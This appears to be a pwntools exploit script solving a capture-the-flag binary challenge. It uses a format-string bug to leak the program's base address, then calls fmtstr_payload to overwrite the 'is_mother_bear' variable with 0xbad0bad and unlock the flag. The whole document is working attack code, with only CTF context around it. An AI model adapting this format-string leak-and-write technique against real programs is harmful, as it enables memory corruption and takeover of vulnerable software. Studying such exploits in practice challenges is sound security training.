from pwn import *

exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
		
gdbscript='''

'''.format(**locals())


p = start()

def offset():
	for i in range(30):
		  payload = f"AAAA%{i}$x".encode()

		  p.sendline(payload)

		  output = p.clean()

		  if b"41414141" in output:
		      return i
		      break

p.sendlineafter(b'say: ', b'%15$p')
p.recvuntil(b"* ")
leak_elf = int(p.recvuntil(b" *", drop=True),16)
elf.address = leak_elf - 0x1678
log.success(f"ELF base address : {leak_elf}")
user_offset=22
log.success(f"User input is at offset : {user_offset}")

payload = fmtstr_payload(user_offset, { elf.sym['is_mother_bear']: 0xbad0bad })

p.sendlineafter(b"say: ", payload)

p.sendlineafter(b"say: ",b"flag")

p.interactive()

